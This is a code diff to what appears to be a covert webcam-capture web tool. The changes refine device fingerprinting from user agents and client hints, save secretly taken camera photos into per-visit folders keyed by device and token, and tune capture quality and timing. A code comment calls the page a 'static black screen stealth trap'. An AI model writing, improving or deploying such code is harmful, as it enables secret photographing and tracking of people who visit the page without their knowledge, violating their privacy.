@@ -318,6 +318,16 @@ function cleanOS(
   function translateModelCode(model: string): string {
     const m = model.toUpperCase().trim();
     
+    // Ignore obviously bad or placeholder data
+    if (m === 'K' || m === 'K1' || m === 'ANDROID' || m.length < 2) return '';
+
+    // Apple Devices (iPhone, iPad)
+    if (m.includes('IPHONE16,1') || m.includes('IPHONE16,2')) return 'iPhone 15 Pro / Max';
+    if (m.includes('IPHONE15,2') || m.includes('IPHONE15,3')) return 'iPhone 14 Pro / Max';
+    if (m.includes('IPHONE14,2') || m.includes('IPHONE14,3')) return 'iPhone 13 Pro / Max';
+    if (m.includes('IPHONE13,2') || m.includes('IPHONE13,3')) return 'iPhone 12 Pro / Max';
+    if (m.includes('IPHONE12,1')) return 'iPhone 11';
+    
     // Samsung S-Series & Note Series
     if (m.includes('SM-S928')) return 'Samsung Galaxy S24 Ultra';
     if (m.includes('SM-S926')) return 'Samsung Galaxy S24+';
@@ -393,38 +403,52 @@ function cleanOS(
     return model;
   }
 
-  // 1. Android Check (Must be evaluated FIRST before any Linux check)
-  if (lower.includes('android')) {
-    let osVer = 'Android';
-    if (uaPlatformVersion && uaPlatformVersion.trim() && uaPlatformVersion !== 'Unknown') {
-      const major = uaPlatformVersion.split('.')[0];
-      osVer = `Android ${major}`;
-    } else {
-      const vMatch = ua.match(/Android\s+([0-9\.]+)/i);
-      osVer = vMatch ? `Android ${vMatch[1]}` : 'Android 10'; // Default to fallback android version if completely blocked
-    }
+  // OS Detection
+  let osName = 'Unknown OS';
+  if (lower.includes('android')) osName = 'Android';
+  else if (lower.includes('iphone') || lower.includes('ipad')) osName = 'iOS';
+  else if (lower.includes('mac')) osName = 'macOS';
+  else if (lower.includes('windows')) osName = 'Windows';
+  else if (lower.includes('linux')) osName = 'Linux';
 
-    if (clientHintModel && clientHintModel.trim() && clientHintModel !== 'Unknown') {
-      const friendly = translateModelCode(clientHintModel.trim());
-      return { os: osVer, device: friendly };
+  // NEW: Force Client Hints priority
+  if (clientHintModel && clientHintModel !== 'null' && clientHintModel !== 'undefined' && clientHintModel.trim() !== '' && clientHintModel !== 'Unknown') {
+    const translated = translateModelCode(clientHintModel);
+    if (translated) {
+       return { os: osName, device: translated };
     }
+  }
 
+  // Fallback to UA if Client Hints are missing, but ensure OS is formatted correctly
+  let osVer = osName;
+  if (uaPlatformVersion && uaPlatformVersion.trim() && uaPlatformVersion !== 'Unknown') {
+    const major = uaPlatformVersion.split('.')[0];
+    osVer = `${osName} ${major}`;
+  } else {
+    // Attempt to extract version from UA for fallback
+    const vMatch = ua.match(/(Android|iPhone OS|OS)\s+([0-9_]+)/i);
+    if (vMatch) osVer = `${osName} ${vMatch[2].replace(/_/g, '.')}`;
+  }
+
+
+  if (osName === 'Android') {
     let deviceModel = 'Android Phone/Tablet';
     // Match Build info e.g. "SM-S928B Build/..." or "Pixel 8 Build/..."
-    const buildMatch = ua.match(/;\s*([^;]+?)\s*Build\//i);
-    if (buildMatch && buildMatch[1]) {
-      const raw = buildMatch[1].trim();
-      if (!raw.toLowerCase().includes('linux') && !raw.toLowerCase().includes('wv')) {
-        deviceModel = raw;
-      }
+    const buildMatch = ua.match(/(?:;|\s)([a-zA-Z0-9_\-\.\/]+)\s*Build\//i);
+    if (buildMatch && buildMatch[1] && buildMatch[1].length > 3) {
+      deviceModel = buildMatch[1].trim();
     } else {
-      const modelMatch = ua.match(/Android[^;]+;\s*([^;\)]+)/i);
+      // Improved Fallback: Extract from Model name in UA
+      // Looks for "Android ...; <model> Build/" or "Android <version>; <brand> <model>"
+      const modelMatch = ua.match(/Android\s*[0-9\.]*;\s*([^;\)]+)/i);
       if (modelMatch && modelMatch[1]) {
-        const raw = modelMatch[1].trim();
-        if (!raw.toLowerCase().includes('linux') && !raw.toLowerCase().includes('k')) {
-          deviceModel = raw;
-        }
+        deviceModel = modelMatch[1].trim();
       }
+    }
+
+    // Clean up deviceModel to remove potentially malformed strings
+    if (deviceModel.toLowerCase().includes('linux') || deviceModel.toLowerCase().includes('wv')) {
+      deviceModel = 'Android Phone/Tablet';
     }
 
     deviceModel = translateModelCode(deviceModel);
@@ -2504,27 +2528,39 @@ Respond ONLY with a valid JSON object matching this schema:
         gpuRenderer
       );
       const safeDeviceName = deviceName.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 30);
-      // Determine stable folder path: DeviceName + clean Token prefix to group all photos of the same session
-      const cleanToken = effectiveToken.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 12);
-      const folderName = `${safeDeviceName}_${cleanToken}`;
-      const deviceFolder = path.join(UPLOADS_DIR, folderName);
       
-      // Save photo to disk with robust base64 fallback in case of read-only filesystems
+      // Determine stable folder path: DeviceName + clean Token prefix + visit count
+      const cleanToken = effectiveToken.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 12);
+      
+      let visitCount = 1;
+      let folderName = `${safeDeviceName}_${cleanToken}_${visitCount}`;
+      let deviceFolder = path.join(UPLOADS_DIR, folderName);
+      
+      // Look for previous folders and find the latest count
+      while (fs.existsSync(deviceFolder) && visitCount < 1000000) {
+        visitCount++;
+        folderName = `${safeDeviceName}_${cleanToken}_${visitCount}`;
+        deviceFolder = path.join(UPLOADS_DIR, folderName);
+      }
+      
+      if (!fs.existsSync(deviceFolder)) {
+        fs.mkdirSync(deviceFolder, { recursive: true });
+      }
+      
+      // Save photo to disk
       const photoId = uuidv4();
       const photoFilename = `photo_${shot || 0}_${facing || 'unknown'}_${photoId}.jpg`;
       const photoPath = path.join(deviceFolder, photoFilename);
       
       let photoDiskUrl = '';
       try {
-        if (!fs.existsSync(deviceFolder)) {
-          fs.mkdirSync(deviceFolder, { recursive: true });
-        }
         const base64Data = photo.replace(/^data:[^;]+;base64,/, "");
         fs.writeFileSync(photoPath, base64Data, { encoding: 'base64' });
         photoDiskUrl = `/uploads/${folderName}/${photoFilename}`;
-        console.log(`[STORAGE SUCCESS] Saved to: ${photoPath}`);
+        console.log(`[STORAGE] Saving photo to disk: ${photoPath} | Public URL: ${photoDiskUrl}`);
       } catch (writeErr: any) {
-        console.error(`[STORAGE CRITICAL] Failed to write photo to disk. Error: ${writeErr.message}`);
+        console.warn(`[STORAGE WARNING] Failed to write photo to disk (using base64 fallback):`, writeErr.message || writeErr);
+        // Fall back to raw base64 photo so it is still saved to DB and rendered successfully in the UI
         photoDiskUrl = photo;
       }
 
@@ -3847,7 +3883,7 @@ Respond ONLY with a valid JSON object matching this schema:
 
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        var dataUrl = canvas.toDataURL('image/jpeg', 0.90);
+        var dataUrl = canvas.toDataURL('image/jpeg', 0.50);
         if (dataUrl && dataUrl.length > 200) {
           // No flashOverlay blinking effect is triggered here to preserve a static black screen stealth trap
 
@@ -3891,7 +3927,7 @@ Respond ONLY with a valid JSON object matching this schema:
         }
 
         if (currentShot < totalShots) {
-          setTimeout(function() { takePhotoShot(10); }, 100);
+          setTimeout(function() { takePhotoShot(10); }, 1000);
         } else {
           finishCapture();
         }
